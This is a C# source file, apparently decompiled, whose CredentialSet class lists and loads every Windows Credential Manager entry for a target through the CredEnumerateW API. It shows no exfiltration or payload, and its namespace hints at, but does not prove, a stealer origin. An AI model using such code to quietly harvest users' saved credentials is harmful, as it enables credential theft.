#define TRACE
using NoiseMe.Drags.App.DTO.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
	public class CredentialSet : List<Credential>, IDisposable
	{
		private bool _disposed;

		public string Target
		{
			get;
			set;
		}

		public CredentialSet()
		{
		}

		public CredentialSet(string target)
			: this()
		{
			if (string.IsNullOrEmpty(target))
			{
				throw new ArgumentNullException("target");
			}
			Target = target;
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}

		~CredentialSet()
		{
			Dispose(disposing: false);
		}

		private void Dispose(bool disposing)
		{
			if (!_disposed && disposing && base.Count > 0)
			{
				ForEach(delegate(Credential cred)
				{
					cred.Dispose();
				});
			}
			_disposed = true;
		}

		public CredentialSet Load()
		{
			Loadpublic();
			return this;
		}

		private void Loadpublic()
		{
			IntPtr pCredentials = IntPtr.Zero;
			if (!NativeMethods.CredEnumerateW(Target, 0, out uint count, out pCredentials))
			{
				Trace.WriteLine($"Win32Exception: {new Win32Exception(Marshal.GetLastWin32Error()).ToString()}");
				return;
			}
			IntPtr[] array = new IntPtr[count];
			for (int i = 0; i < count; i++)
			{
				array[i] = Marshal.ReadIntPtr(pCredentials, IntPtr.Size * i);
			}
			List<NativeMethods.CriticalCredentialHandle> list = (from ptrCred in array
				select new NativeMethods.CriticalCredentialHandle(ptrCred)).ToList();
			IEnumerable<Credential> collection = (from handle in list
				select handle.GetCredential()).Select(delegate(NativeMethods.CREDENTIAL nativeCredential)
			{
				Credential credential = new Credential();
				credential.Loadpublic(nativeCredential);
				return credential;
			});
			AddRange(collection);
			list.ForEach(delegate(NativeMethods.CriticalCredentialHandle handle)
			{
				handle.SetHandleAsInvalid();
			});
			NativeMethods.CredFree(pCredentials);
		}
	}
}
